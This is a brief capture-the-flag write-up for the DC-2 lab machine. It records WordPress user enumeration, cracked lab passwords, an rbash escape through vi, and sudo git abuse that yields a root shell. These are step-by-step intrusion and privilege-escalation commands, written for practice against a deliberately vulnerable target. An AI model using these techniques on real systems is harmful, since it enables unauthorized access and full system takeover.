# DC-2: Machine Notes

## Recon

### Nmap
- Port 80/tcp: HTTP (Apache 2.4.10, WordPress)
- Port 7744/tcp: SSH (OpenSSH 6.7p1)
- Note: Redirects to `http://dc-2/`, added to `/etc/hosts`.

### Web Enumeration
- WordPress 4.7.10.
- User enumeration via `wpscan`: `admin`, `jerry`, `tom`.
- Password cracking/spraying with `cewl` wordlist:
  - `tom` : `parturient`
  - `jerry` : `adipiscing`

## Initial Access

### SSH (tom)
- SSH access as `tom` on port 7744:
```bash
ssh tom@dc-2 -p 7744
```
- Shell is restricted (`rbash`).

### Restricted Shell Escape (rbash)
- Escape `rbash` using `vi`:
  1. Open `vi`.
  2. `:set shell=/bin/bash`
  3. `:shell`
- Fix path:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Privilege Escalation

### Lateral Movement (tom to jerry)
- Found hint in `flag3.txt` to "su" for more access.
```bash
su jerry
# Password: adipiscing
```

### Sudo Abuse (git)
- `sudo -l` for `jerry`:
  - `(root) NOPASSWD: /usr/bin/git`
- Abuse `git` to gain root shell:
```bash
sudo git -p help config
!/bin/bash
```
- Result: **Root shell**.
